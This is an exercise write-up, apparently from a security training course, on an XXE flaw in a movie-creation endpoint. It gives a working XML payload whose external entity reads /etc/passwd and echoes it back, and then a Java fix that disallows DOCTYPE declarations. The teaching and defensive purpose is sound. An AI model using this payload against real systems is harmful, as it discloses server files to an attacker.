# Exercise 7
The method to create a movie by passing an xml payload as a string parameter of the http request is vulnerable to xxe.
It allows us to pass a xml document that references a external entity and put its content in the movie we create. Since the request returns us the movie data, we can use this exploit to retrieve any data from the remote system or to which the remote system has access.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE createMovie [  
   <!ELEMENT createMovie ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
<createMovie>
	<title>Star Wars: The empire strikes back</title>
	<description>&xxe;</description>
	<genre>sci-fi</genre>
</createMovie>
```
The above payload retuens us the content of the /etc/passwd file that contains all the users from the remote system.

## Fix
Disable the option for the document builder to pass it a custom DTD.
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
